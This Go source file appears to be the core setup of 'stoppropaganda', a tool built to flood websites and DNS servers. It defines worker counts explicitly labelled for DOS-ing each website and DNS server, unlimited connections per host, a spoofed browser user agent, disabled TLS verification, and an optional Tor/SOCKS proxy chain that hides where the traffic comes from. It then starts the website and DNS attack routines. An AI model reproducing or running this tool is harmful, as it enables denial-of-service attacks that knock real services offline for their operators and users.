package stoppropaganda

import (
	"crypto/tls"
	"flag"
	"log"
	"math"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/sockshttp"
	"github.com/miekg/dns"
	"github.com/peterbourgon/ff/v3"
	"github.com/valyala/fasthttp"
)

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagBind       = fs.String("bind", ":8049", "bind on specific host:port")
	flagWorkers    = fs.Int("workers", 20, "DOS each website with this amount of workers")
	flagTimeout    = fs.Duration("timeout", 10*time.Second, "timeout of HTTP request")
	flagDNSWorkers = fs.Int("dnsworkers", 100, "DOS each DNS server with this amount of workers")
	flagDNSTimeout = fs.Duration("dnstimeout", 125*time.Millisecond, "timeout of DNS request")
	flagUserAgent  = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
)

func Start() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))

	startWebsites()
	startDNS()

	log.Println("Started!")
	panic(fasthttp.ListenAndServe(*flagBind, fasthttpRequestHandler))
}

var httpClient *fasthttp.Client

var dnsClient *dns.Client

func init() {
	rand.Seed(time.Now().UnixNano())

	// Create DNS client and dialer
	dnsClient = new(dns.Client)
	dnsClient.Dialer = &net.Dialer{
		Timeout: *flagDNSTimeout,
	}

	// Create HTTP client
	httpClient = &fasthttp.Client{
		ReadTimeout:                   *flagTimeout,
		WriteTimeout:                  *flagTimeout,
		MaxIdleConnDuration:           time.Hour,
		NoDefaultUserAgentHeader:      true,
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:        true,
		MaxConnsPerHost:               math.MaxInt,
		Dial:                          makeDialFunc(),
		TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
	}
}

func makeDialFunc() fasthttp.DialFunc {

	masterDialer := sockshttp.FromEnvironment()

	useTorExample := false
	if useTorExample {
		proxyTimeout := 600 * time.Second
		proxyChain := []Proxy{
			{"127.0.0.1:9050", ProxyMethodSocks5},
			// you can even chain proxies...
			//{"1.2.3.4:9050", ProxyMethodSocks4},
		}
		dialer := &net.Dialer{
			//LocalAddr: localAddr,
			Timeout: 600 * time.Second,
		}
		masterDialer = MakeDialerThrough(dialer, proxyChain, proxyTimeout)
	}

	dial := (&TCPDialer{
		Concurrency:      math.MaxInt,
		DNSCacheDuration: 5 * time.Minute,

		// stoppropaganda's implementation
		ParentDialer: masterDialer,
	}).Dial
	return dial
}
